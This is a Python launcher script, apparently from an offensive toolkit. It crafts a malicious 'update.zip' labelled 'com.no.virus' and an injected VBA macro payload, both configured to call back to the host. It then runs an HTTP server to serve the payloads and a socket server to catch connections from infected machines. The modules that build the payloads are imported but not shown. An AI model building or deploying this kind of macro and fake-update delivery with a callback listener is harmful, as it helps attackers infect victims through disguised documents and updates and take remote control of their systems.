from HttpServer import startHTTPServer
from InfectedVBAMacro import VBAMacro
from SocketServer import startSocketServer
from threading import Thread
from time import sleep
from pathlib import Path
from GetIP import getLocalIP
import signal
import InfectedUpdate


HOST = getLocalIP()
HTTP_PORT = 8080
TCP_PORT = 5050


def handler(*_):
    print("Exiting")
    exit(0)


def main():
    assetsFolder = Path('./Assets')
    if not assetsFolder.exists() or not assetsFolder.is_dir():
        assetsFolder.mkdir()
        print('[+] \'.\\Assets\' folder created.')
    if not (assetsFolder / 'update.zip').exists():
        print('[*] \'update.zip\' was not found. Crafting zip payload...')
        InfectedUpdate.infectedUpdate('com.no.virus', HOST, TCP_PORT)
        print('[+] \'update.zip\' successfully created.')
    if not (assetsFolder / 'injection.vba').exists():
        print('[*] \'injection.vba\' was not found. Crafting VBA payload...')
        VBAMacro(assetsFolder / 'injection.vba', HOST, HTTP_PORT)
        print('[+] VBA payload successfully created.')
    signal.signal(signal.SIGINT, handler)
    httpServer_proc = Thread(target=startHTTPServer, args=(HOST, HTTP_PORT))
    httpServer_proc.daemon = True
    socketServer_proc = Thread(target=startSocketServer, args=(HOST, TCP_PORT))
    socketServer_proc.daemon = True
    httpServer_proc.start()
    sleep(5)
    socketServer_proc.start()
    while 1:
        sleep(60)


if __name__ == '__main__':
    main()
